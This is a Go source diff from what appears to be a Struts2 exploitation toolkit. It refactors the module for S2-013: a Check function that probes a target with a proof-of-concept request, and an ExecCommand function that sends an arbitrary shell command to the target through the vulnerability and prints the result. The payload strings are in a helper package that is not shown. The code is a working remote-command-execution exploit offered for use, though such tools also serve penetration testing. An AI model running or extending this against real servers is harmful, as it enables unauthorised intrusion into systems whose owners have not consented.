@@ -1,61 +1,24 @@
 package s013
 
 import (
-	"ST2G/cvemod/x51utils"
+	"ST2G/cvemod/utils"
 	"fmt"
-	"io/ioutil"
-	"log"
-	"net/http"
+	"github.com/fatih/color"
+	"net/url"
 	"strings"
-	"time"
 )
 
 
-func Check(url string){
-	url+=x51utils.POC_s013_check
-	req, err := http.NewRequest("GET", url, nil)
-	if err != nil {
-		log.Fatal("Error reading request. ")
-	}
-	client := &http.Client{Timeout: time.Second * 10}
-	resp, err := client.Do(req)
-
-	if err != nil {
-		log.Fatal("Error reading response. 访问出错")
-	}
-	defer resp.Body.Close()
-
-	body, err := ioutil.ReadAll(resp.Body)
-	if err != nil {
-		log.Fatal("Error reading body. ")
-	}
-	respBody := string(body)
-	isVulnable := strings.Contains(respBody, "6308")
-	if isVulnable {
-		x51utils.Colorlog("Found Struts2-013!")
-
-	} else {
+func Check(targetUrl string){
+	respString := utils.GetFunc4Struts2(targetUrl,"",utils.POC_s013_check)
+	if utils.IfContainsStr(respString,"6308"){
+		color.Red("*Found Struts2-013！")
+	}else {
 		fmt.Println("Struts2-013 Not Vulnerable.")
 	}
 }
-func ExecCommand(url string,command string) {
-	url += x51utils.POC_s013_exec(command)
-	req, err := http.NewRequest("GET", url, nil)
-	if err != nil {
-		log.Fatal("Error reading request. ")
-	}
-	client := &http.Client{Timeout: time.Second * 10}
-
-	resp, err := client.Do(req)
-	if err != nil {
-		log.Fatal("Error reading response. ")
-	}
-	defer resp.Body.Close()
-
-	body, err := ioutil.ReadAll(resp.Body)
-	if err != nil {
-		log.Fatal("Error reading body. ")
-	}
-	respBody := string(body)
-	fmt.Println(respBody)
+func ExecCommand(targetUrl string,command string) {
+	respString := utils.GetFunc4Struts2(targetUrl,"",utils.POC_s013_exec(command))
+	respString = strings.Replace(url.QueryEscape(respString),"%00","",-1)
+	fmt.Println(url.QueryUnescape(respString))
 }
